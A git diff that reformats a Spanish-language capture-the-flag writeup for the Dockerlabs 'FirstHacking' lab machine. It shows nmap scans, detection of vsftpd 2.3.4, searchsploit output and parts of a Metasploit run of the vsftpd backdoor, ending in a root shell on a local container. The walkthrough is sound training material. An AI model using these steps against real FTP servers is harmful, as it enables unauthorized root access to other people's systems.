@@ -1,22 +1,30 @@
-# 🖥️ Writeup - FirstHacking 
+---
+icon: linux
+---
 
-**Plataforma:** Dockerlabs  
-**Sistema Operativo:** Linux  
+# FirstHacking ​​
+
+## 🖥️ Writeup - FirstHacking
+
+**Plataforma:** Dockerlabs\
+**Sistema Operativo:** Linux
 
 > **Tags:** `Linux` `FTP` `Metasploit` `Searchsploit` `Backdoor` `RCE`
 
-# INSTALACIÓN
+## INSTALACIÓN
 
 Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.
 
-```bash 
+```bash
 unzip firsthacking.zip
 ```
+
 La máquina ya está descomprimida y solo falta montarla.
 
 ```bash
 sudo bash auto_deploy.sh firsthacking.tar
-``` 
+```
+
 Info:
 
 ```
@@ -41,23 +49,24 @@ Estamos desplegando la máquina vulnerable, espere un momento.
 Máquina desplegada, su dirección IP es --> 172.17.0.2
 
 Presiona Ctrl+C cuando termines con la máquina para eliminarla
-``` 
+```
 
 Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.
 
-# ESCANEO DE PUERTOS
+## ESCANEO DE PUERTOS
 
 A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
-``` 
+```
 
 ```bash
 nmap -n -Pn -sCV -p21 --min-rate 5000 172.17.0.2
 ```
 
 Info:
+
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-11 18:04 CEST
 Nmap scan report for 172.17.0.2
@@ -71,11 +80,13 @@ Service Info: OS: Unix
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 1.32 seconds
 ```
+
 Vemos que solo el puerto `21` (`FTP`) está abierto y que la versión de `vsftpd` que corre es la `2.3.4`.
 
 Esta versión en concreto es vulnerable a `Backdoor Command Execution`, como podemos comprobar tras utilizar `searchsploit`.
 
 Info:
+
 ```
 ----------------------------------------- ---------------------------------
  Exploit Title                           |  Path
@@ -96,6 +107,7 @@ run
 ```
 
 Info:
+
 ```
 [*] 172.17.0.2:21 - Banner: 220 (vsFTPd 2.3.4)
 [*] 172.17.0.2:21 - USER: 331 Please specify the password.
@@ -113,6 +125,7 @@ whoami
 ```
 
 Info:
+
 ```
 root@0cc78b8316b6:~/vsftpd-2.3.4# whoami
 root
